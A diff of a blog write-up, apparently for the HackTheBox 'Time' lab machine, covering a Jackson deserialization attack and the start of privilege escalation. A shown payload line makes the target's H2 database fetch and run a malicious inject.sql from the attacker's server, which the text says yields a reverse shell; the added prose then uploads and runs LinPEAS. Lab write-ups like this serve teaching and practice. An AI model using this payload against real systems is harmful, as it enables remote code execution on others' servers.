@@ -204,9 +204,40 @@ Note that my IP changed since last time! In addition to that, the third line was
 ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url""jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.22:8000/inject.sql'"}]
 ```
 
+We see the server downloads our malicious file:
+
+<div class="img_container">
+![server dl inject.sql]({{https://jsom1.github.io/}}/_images/htb_time_get.png)
+</div>
+
+It runs it and connects back to us:
+
+<div class="img_container">
+![reverse shell!]({{https://jsom1.github.io/}}/_images/htb_time_shell.png)
+</div>
+
+And we have the user flag! We must now find a way to elevate our privileges. In my little experience, there is always a link between the machine name and something we have to do. Since I started this box, I've been wondering if "Time" was a reference to cronjobs. Before we enumerate manually, let's upload a script and see if it finds any vulnerability. This time, let's try linpeas.sh. LinPEAS stands for Linux Privilege Escalation Awesome Script and it searches for possible paths to escalate privileges on Linux/Unix hosts.\\
+We start by downloading the script on ourr Kali machine (we clone the repo):
+````
+git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
+`````
+We serve it in the directory where we started our web server, and download it on the server:
+
+<div class="img_container">
+![linpeas download]({{https://jsom1.github.io/}}/_images/htb_time_linpeas.png)
+</div>
+
+Note that it is necessary to give execute permissions to the script before executing it. When done, we run it with *./linpeas.sh*. It outputs a ton of information. I think there might be different ways to get root, because the scripts reveals many interesting things. However, let's focus on one that is somehow related to the box's name:
+
+<div class="img_container">
+![clue]({{https://jsom1.github.io/}}/_images/htb_time_clue.png)
+</div>
 
 
-TODO : repreenddre 1ere requet qui a crash et add la commande. Need aussi choper Jruby que je sers sur le serv et copier la commande entière '??
+
+
+
+
 
 <ins>**My thoughts**</ins>
 
